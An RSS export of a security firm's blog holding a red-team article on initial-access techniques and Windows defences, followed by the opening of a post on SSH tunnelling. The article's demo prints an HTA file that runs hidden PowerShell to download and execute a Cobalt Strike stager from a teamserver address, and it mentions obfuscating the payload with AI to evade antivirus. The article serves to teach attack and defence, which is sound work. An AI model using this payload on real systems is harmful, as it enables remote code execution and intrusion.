<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Initial-Access</title>
    <link>//localhost:1313/categories/initial-access/</link>
    <description>Recent content in Initial-Access on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Tue, 20 Aug 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/initial-access/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>Adversary at the Door - Initial Access and what&#39;s currently on the menu</title>
      <link>//localhost:1313/articles/2024/08/2024-08-20-adversary-at-the-door-initial-access-and-whats-currently-on-the-menu/</link>
      <pubDate>Tue, 20 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-20-adversary-at-the-door-initial-access-and-whats-currently-on-the-menu/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/wolf-in-sheep-clothes-1.png&#34; title=&#34;wolf in sheep clothes 1&#34; alt=&#34;wolf in sheep clothes 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;wolf in sheep clothes 1&lt;/figcaption&gt;
  &lt;/figure&gt;Based on the data from the &lt;a href=&#34;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Cyber Security Breaches Survey 2024&lt;/a&gt;, phishing with malicious links or malware remains the most common initial access vector, followed by impersonation. The challenge with impersonation attacks is that current technology often struggles to accurately determine the purpose of a website. Although checks on domain maturity, reputation, categorization, and certificates are performed, a skilled adversary can still create sophisticated phishing infrastructure that hosts malware. This allows them to establish a foothold within a network and gain initial access, despite various defences.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://attack.mitre.org/tactics/TA0108/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Initial access&lt;/a&gt; is a set of techniques that exploit different entry points to gain an initial foothold in an organisation&amp;rsquo;s network. There are several initial access techniques that can include various social engineering methodologies and exploitation methods, for example misconfigured web servers i.e. instance of Apache Tomcat or exposed management services, i.e. Remote Desktop Protocol on port 3389. It can also include a trusted third party compromise where direct access is gained from captured credentials or a device.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image8&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 1: Visual representation of cyber kill chain.&lt;/p&gt;
&lt;p&gt;The initial exploitation can be long-term or limited based on the method of entry and reason for exploitation. Once the adversary gets a foothold within the network, the attack execution is carried out, where the adversary tries to run malicious code, explore the network, or steal confidential data. This in itself has also become a lucrative business, as IAB&amp;rsquo;s (Initial Access Brokers) have specialised in doing just that, gaining the access to the networks and then selling it to other threat actors as it becomes significantly harder from year to year.&lt;/p&gt;
&lt;p&gt;Fortunately, there are safeguards in place that protect organisations and users from adversaries, making initial access significantly more challenging when a defense-in-depth strategy is properly implemented. This is a stark contrast to the threat landscape of 10-15 years ago. Also on the other side, we frequently hear major news about vulnerabilities, bypasses, and exploitation of these control technologies that are our very . For example, just last week, a Windows SmartScreen vulnerability was discovered and exploited to deploy malware in the wild, as reported in this &lt;a href=&#34;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;article&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;What prevents Initial Access?&lt;/h1&gt;&lt;p&gt;As previously mentioned, adversaries now face significant challenges in gaining initial access to systems and networks. These challenges arise from a multi-layered cybersecurity approach that employs advanced technologies and best practices. Given that most of our clients at JUMPSEC rely on Windows and Active Directory, I&amp;rsquo;ll highlight technology examples specific to that environment.&lt;/p&gt;
&lt;p&gt;Here are some key technologies that effectively thwart less sophisticated initial access attempts:&lt;/p&gt;
&lt;h3&gt;Windows SmartScreen&lt;span class=&#34;absolute -mt-20&#34; id=&#34;windows-smartscreen&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#windows-smartscreen&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 2: Upon execution of an unknown binary, SmartScreen popup will appear.&lt;/p&gt;
&lt;p&gt;Windows SmartScreen was originally launched with Windows 8, which was released on October 26, 2012, and is intended to protect users from numerous online risks and has been proven to be effective against less sophisticated adversaries. It works by checking the following upon execution:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Is the signature of that binary a known malware&lt;/li&gt;
&lt;li&gt;Is the binary signed&lt;/li&gt;
&lt;li&gt;Is the certificate signing authority known and trusted by Microsoft&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SmartScreen will display a warning before allowing it to run and potentially detect and prevent malware being run on the system.&lt;/p&gt;
&lt;p&gt;Adversaries employ various methods to bypass these measures. One such tactic involves exploiting Windows&amp;rsquo; inherent trust in binaries - wink wink DLL Side Loading, but delving into this topic merits another blog post. In contrast to SmartScreen, which primarily assesses the reputation of the entry point program, Windows 11’s Smart App Control takes a more comprehensive approach. It verifies the integrity and digital signatures of all code (including DLLs, scripts, etc.) loaded by the Windows OS Loader and script engines to enhance security measures.&lt;/p&gt;
&lt;h3&gt;Signature verification&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signature-verification&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#signature-verification&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft&amp;rsquo;s Authenticode technology allows software publishers to use X.509 code-signing certificates to sign their software. These certificates verify the identity of the software publisher to ensure that the software remains unchanged since it was signed by the original issuer.&lt;/p&gt;
&lt;p&gt;Microsoft does not verify the publisher&amp;rsquo;s identity or the integrity of the code directly. Instead, it relies on a robust Public Key Cryptography (PKI) system which enables a third-party certificate authority, such as Sectigo (formerly Comodo CA), to authenticate the publisher and hash the code.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image13&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 3: UAC Prompt will notify users in both cases where the publisher is known and unknown.&lt;/p&gt;
&lt;p&gt;With Microsoft Authenticode, various types of Windows executables and code can be signed, including &lt;em&gt;.exe&lt;/em&gt;, &lt;em&gt;.cab&lt;/em&gt;, &lt;em&gt;.dll&lt;/em&gt;, &lt;em&gt;.ocx&lt;/em&gt;, and &lt;em&gt;.xpi&lt;/em&gt; files, in both 32-bit and 64-bit user modes.&lt;/p&gt;
&lt;p&gt;Authenticode certificates are used to verify and hash both software or code developed by a publisher. Although the certificates are issued by Microsoft, the validation and hashing processes are conducted by a trusted certificate authority (CA) like Sectigo. This ensures that the code comes from a verified source and remains unchanged since its release. Unfortunately, it has been discovered that adversaries are abusing signature verification, as discovered by (&lt;a href=&#34;https://symantec-enterprise-blogs.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://symantec-enterprise-blogs.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse&lt;/a&gt;). The APT called Carderbee was able to get Microsoft to digitally sign a type of malware known as a rootkit. To gain that level of access without alerting end-point security systems and other defences, the Carderbee hackers required their rootkit to receive Microsoft approval, which it did after Microsoft signed it.&lt;/p&gt;
&lt;h3&gt;Application Allowlisting and Blocklisting&lt;span class=&#34;absolute -mt-20&#34; id=&#34;application-allowlisting-and-blocklisting&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#application-allowlisting-and-blocklisting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image12&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 4: Applocker Popup.&lt;/p&gt;
&lt;p&gt;Application allowlisting ensures that only authorised software can execute, while blocking all unauthorised software from running on your assets. This prevents malicious or unapproved applications from potentially compromising the system. The application allowlisting software must verify that only authorised software libraries (such as &lt;em&gt;.dll,&lt;/em&gt; .ocx, etc.) are permitted to load into system processes. This helps to maintain the integrity of your system by preventing unauthorised code from being injected.&lt;/p&gt;
&lt;p&gt;In Windows environments, specifically in Active Directory we can utilise group policies, Applocker or something stricter like Windows Defender Application Control to maintain and enforce control policies over applications and binaries.&lt;/p&gt;
&lt;h3&gt;Mark-Of-The-Web (MOTW)&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mark-of-the-web-motw&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#mark-of-the-web-motw&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Mark-of-the-Web (MOTW) is a security feature originally introduced in Internet Explorer to ensure that saved web pages and other downloaded files run in the security zone corresponding to their origin. It was accomplished by appending to saved webpages and was later extended to support other file types using Alternate Data  Streams (ADS), which is a feature of NTFS file system that dates back to Windows 3.1.&lt;/p&gt;
&lt;p&gt;This feature allows files to have multiple data streams associated with them, by using the &lt;code&gt;|filename:streamname&lt;/code&gt; format. It also applies to MS Office, and other programs by utilising &lt;code&gt;|AttachmentExecuteInterface&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So when we have downloaded the file, Internet Explorer creates an ADS named &lt;code&gt;Zone.Identifier&lt;/code&gt; and adds a &lt;code&gt;ZoneID&lt;/code&gt; to the stream in order to indicate a zone that file comes from.&lt;/p&gt;
&lt;p&gt;In ADS, we have the following ZoneID values and their representations:&lt;/p&gt;
&lt;ol start=&#34;0&#34;&gt;
&lt;li&gt;Local computer&lt;/li&gt;
&lt;li&gt;Local intranet&lt;/li&gt;
&lt;li&gt;Trusted sites&lt;/li&gt;
&lt;li&gt;Internet&lt;/li&gt;
&lt;li&gt;Restricted sites&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image123.png&#34; title=&#34;image123&#34; alt=&#34;image123&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image123&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 5: ADS created on downloaded file.&lt;/p&gt;
&lt;p&gt;As we can see in the figure above, all modern Windows platforms that are dealing with downloaded files or attachments will generate a &lt;code&gt;Zone.Identifier&lt;/code&gt; in ADS stream, adding URL information such as Referrer and Host information in addition to the zone. This information can be used to enhance antivirus and various endpoint detection and response (EDR) products to aid the reputation checks of the file.&lt;/p&gt;
&lt;p&gt;Mark-of-the-Web (MotW) nowadays serves as a barrier to successful phishing attacks by giving users the option to decline execution. It also collaborates with SmartScreen, enabling access to the registered antivirus engine to perform additional checks on signatures and reputation. Nevertheless, adversaries can circumvent these protections as they might deliver a phishing attachment that evades supplementary prompts or inspections.&lt;/p&gt;
&lt;p&gt;Alternatively, they could create a malicious extension that closely resembles legitimate content, tricking victims into inadvertently providing initial access.&lt;/p&gt;
&lt;h3&gt;Office Security Controls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;office-security-controls&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#office-security-controls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 6: Macro security controls.&lt;/p&gt;
&lt;p&gt;Macros have been a favoured initial access method for threat actors since the early days, persisting as one of the longest-enduring challenges in the industry. One notable event was usage of the macro in the &lt;a href=&#34;https://www.acronis.com/en-gb/cyber-protection-center/posts/vawtrak-a-banking-trojan-with-a-long-history/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Vawtrak&lt;/a&gt; malware campaign, discovered in 2014 and was used to spread and steal credentials in the Bank of America attack. Microsoft is trying to battle macro malware by enforcing Mark-of-the-Web (MotW) control on macro-enabled documents. Microsoft’s &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;documentation&lt;/a&gt; states:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;VBA macros are a common way for malicious actors to gain access to deploy malware and ransomware. Therefore, to help improve security in Office, we’re changing the default behavior of Office applications to block macros in files from the internet.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Blocking macros serves a dual purpose: it reduces the potential for attacks and raises the complexity needed to execute them, especially since email remains the primary method for delivering malware.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 7: Upon document execution a macro popup will appear.&lt;/p&gt;
&lt;p&gt;Therefore, we can assert that the threat landscape can be divided into Pre-Macro and Post-Macro eras, as threat actors have swiftly adapted by moving away from macro-based malware to utilising utilities such as OneNote files with .one and .onepkg extensions. This shift has been identified by security researchers as a significant evolution in the email threat landscape in recent history. With that in mind, the following section of the post will introduce different techniques that adversaries are employing in order to facilitate initial access and bypass previously mentioned security measures.&lt;/p&gt;
&lt;h2&gt;Initial Access Demo&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-access-demo&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#initial-access-demo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To achieve initial access, adversaries often require some form of user interaction to execute their kill-chain. For this blog post, let&amp;rsquo;s assume that we are the end-user who has received an email link that successfully bypassed email filters (for more on this, see our blog post on automated smuggling techniques by our red team operator &lt;a href=&#34;https://labs.jumpsec.com/wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Francesco&lt;/a&gt;). Alternatively, we could have been coerced by an adversary through SaaS applications like Teams (for details on this method, refer to &lt;a href=&#34;https://labs.jumpsec.com/advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Max&lt;/a&gt;’s IDOR discovery) to download a binary file.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please note, that in this demo, Microsoft Defender was turned off, although normally during engagements, antivirus/EDR bypassing is another process that is undertaken by operators.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;In this blog post, we are going to use malicious HTA payloads that are being used by adversaries. HTA (HTML Application) is basically an application whose source consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. One caveat with this technique is that it requires Internet Explorer to be installed, otherwise HTA files won&amp;rsquo;t execute on the target computer. It&amp;rsquo;s worth noting that it also runs in &lt;strong&gt;full trust mode&lt;/strong&gt; therefore browser security constraints do not apply here.&lt;/p&gt;
&lt;p&gt;During execution, it uses mshta.exe which native Windows binary that suits perfectly for modern living of the land ethos and handles further malicious code execution without needing to touch the victims disk. LOLBINS are commonly used by adversaries to execute malicious code and evade EDR/AV solutions as those native binaries are often not picked up given they are used for legitimate sysadmin tasks.&lt;/p&gt;
&lt;p&gt;To proceed, we are going to use Cobalt Strike, set up teamserver infrastructure with listeners and use Scripted Web Delivery that will generate stageless beacon payload artefacts that will be handled by our malicious HTA application.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 8: Configuring a Cobalt Strike Listener and Scripted Web Delivery of our payload.&lt;/p&gt;
&lt;p&gt;After that, with truly modern fashion, we are going to politely ask our AI friend to obfuscate it so we can test it out of curiosity against static analysis detection to see how it withstands AV/EDR solutions.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 9: Prompt that was used to obfuscate our PowerShell command for our .hta payload&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s compare static analysis detection rates with the non-obfuscated payload, for this we are going to utilise hybrid analysis. This is an excerpt of an example HTA payload below:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;  
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;HTA Payload Demo&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;  
&amp;lt;body&amp;gt;  
&amp;lt;p&amp;gt;Example Text&amp;lt;/p&amp;gt;  
&amp;lt;/body&amp;gt;  

&amp;lt;script language=&amp;#34;VBScript&amp;#34;&amp;gt;  
Function demo()  
Set shell = CreateObject(&amp;#34;wscript.Shell&amp;#34;)  
shell.run &amp;#34;powershell.exe -nop -w hidden -c &amp;#34;IEX ((new-object net.webclient).downloadstring(&amp;#39;http://192.168.0.7:8088/a&amp;#39;))&amp;#34;&amp;#34;  
End Function  

demo  
&amp;lt;/script&amp;gt;  
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt; &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As we can see in the figure above, we can conclude that with little effort, adversaries can increase their sophistication and attempt to evade some of the detections. In our case we don&amp;rsquo;t need to worry about the AV/EDRs as for demo purposes, we have disabled Windows Defender. But evasion is integrated within the red team craft where we have to tackle each phase of EDR/AV detection, those phases include: Static and Heuristic Analysis, Cloud Reputation Analysis, Sandboxing , Machine Learning Analysis, Emulation and Behavioural Analysis.&lt;/p&gt;
&lt;p&gt;For this reason, there are different cyber kill chains, where in order to evade detection of our HTA payload, we could perhaps use ISO containerisation techniques that would evade Mark-of-the-Web, then use HTML smuggling to fly past phishing detections. Then we could utilise a LNK technique, to trick the end-user into clicking our executable that has fully customised shellcode which is additionally loaded using DLL sideloading of legitimate running process. This just shows how complex implementing new undetectable payloads could be, and how many layers of defences have to be taken into consideration.&lt;/p&gt;
&lt;p&gt;Back to our initial access demo, now that we have our HTA application on the target machine, let&amp;rsquo;s execute it. What will happen in the background is that our powershell code embedded within that HTA application will fetch our Cobalt Strike stager hosted on our teamserver.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 11: Execution of the .hta payload and visible .mshta as “HTML Application Host”&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image11&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 12: Connection was established as can be seen by our beacon that was executed via the HTA payload.&lt;/p&gt;
&lt;p&gt;As demonstrated in the figure above, we have successfully established a connection to our victims&amp;rsquo; host. From this point forward, we can interact with the beacon, marking just the beginning of our red team engagement. The real challenge lies ahead as we delve into persistence, privilege escalation, lateral movement, and pivoting all of which are significant undertakings given the capabilities of current EDR and AV solutions to emulate real-world adversaries and their techniques.&lt;/p&gt;
&lt;h2&gt;Initial Access Prevention Strategies&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-access-prevention-strategies&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#initial-access-prevention-strategies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are several prevention strategies we recommend implementing, as there is no one-size-fits-all solution due to factors such as complex infrastructure setups, data collection and correlation challenges.&lt;/p&gt;
&lt;p&gt;However, we have found that having a robust AV/EDR solution, along with effective patch management, by keeping machines patched and up-to-date against n-day exploits is crucial. Additionally, tightening group policies makes it more difficult for adversaries to navigate and pivot within the network, thereby containing the threat and minimising the &amp;ldquo;blast radius.&amp;rdquo; Implementing email filters with appropriate thresholds and spam rules is also highly recommended, complementing secure mail configurations for protocols like IMAP, SMTP, or POP.&lt;/p&gt;
&lt;p&gt;Furthermore, protecting SaaS applications such as Teams, SharePoint, Exchange Online, or OneDrive through regular configuration reviews is crucial, as these platforms are often targeted for initial access.&lt;/p&gt;
&lt;p&gt;Thank you for taking the time to read this blog. I hope you found it informative and enjoyable. Stay tuned for more of our upcoming blog posts and advisories.&lt;/p&gt;
&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gironsec.com/blog/2020/12/bypassing-windows-smartscreen/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.gironsec.com/blog/2020/12/bypassing-windows-smartscreen/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mgeeky.tech/warcon-2022-modern-initial-access-and-evasion-tactics/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://mgeeky.tech/warcon-2022-modern-initial-access-and-evasion-tactics/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>SSH Tunnelling to Punch Through Corporate Firewalls - Updated take on one of the oldest LOLBINs</title>
      <link>//localhost:1313/articles/2024/08/2024-08-13-ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/</link>
      <pubDate>Tue, 13 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-13-ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/ezgif-7-4b7e7cf968.gif&#34; title=&#34;ezgif 7 4b7e7cf968&#34; alt=&#34;ezgif 7 4b7e7cf968&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;ezgif 7 4b7e7cf968&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In my formative days of learning network hacking, SSH tunnelling was amongst the first tunnelling techniques that I learnt. I still remember trying to repeatedly decode my notes and diagrams on the rather cumbersome syntax of single port forwarding with the -L and -R flags, which at the time was taught as “the way to do it”. If your foothold is (luckily) a Linux server, then you’re blessed with the -D flag to spin up a SOCKS proxy on the foothold itself to access the network via proxychains.&lt;/p&gt;
&lt;p&gt;Fast forward a few years later, in our day-to-day work, be it network pentest or adversary simulation, I’ve found my colleagues and I using good ol’ SSH tunnelling in real engagements not less, but more.&lt;/p&gt;
&lt;p&gt;Quoting what Andy Gill &lt;a href=&#34;https://github.com/ZephrFish&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@ZephrFish&lt;/a&gt; said in SteelCon 2024 a couple of weeks ago:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;“F*** C2 frameworks, a tunnel is all you need.”&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;While I might not feel this as strongly as Andy does, there is more than a pinch of truth in that statement. A good tunnel can often be everything you wanted to execute from the end user laptop. And yet, a Google search “SSH tunnelling in pentesting” and “…in red team engagements”, would see most top results still described the “old” way of punching single port-sized holes with -R and -L, or local dynamic SOCKS with -D, which is actually not at all how we used SSH in our engagements. There are a couple of recent blog posts (linked below) published within the recent 1-2 years describing SSH tunnelling using the Reverse dynamic proxy and their unique spins on it, so I’ll avoid as much overlap content as I can and present our tips and tricks about SSH tunnelling, with a focus on getting through firewalls.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;SSH tunnelling is of course not our primary nor sole way to tunnel out of a client’s network (&lt;a href=&#34;https://labs.jumpsec.com/ligolo-quality-of-life-on-red-team-engagements/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;wink wink&lt;/a&gt;), but whenever I am in a pinch, and nothing else works, this little tool has served me oh-so-well.&lt;/p&gt;
&lt;p&gt;Shoutout to recent blog posts describing similar flavors of the SSH tunnelling technique:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.pentestpartners.com/security-blog/living-off-the-land-with-native-ssh-and-split-tunnelling/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Living off the land with native SSH and split tunnelling&lt;/a&gt; - by PTP’s Joe Blogs in Mar 2024, a concise summary of the fundamental form of this technique&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access&lt;/a&gt; - by Red Siege’s Alex Reid in Apr 2024 going over the interesting take on using Lnk files to turn the SSH tunnelling command into a phishing payload&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://trustedsec.com/blog/the-socks-we-have-at-home&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;The SOCKS we have at Home&lt;/a&gt; - by TRUSTEDSEC’s Esteban Rodriguez in Oct 2023 detailing creation of a limtedaccess user on the remote server for better Opsec&lt;/li&gt;
&lt;/ul&gt;
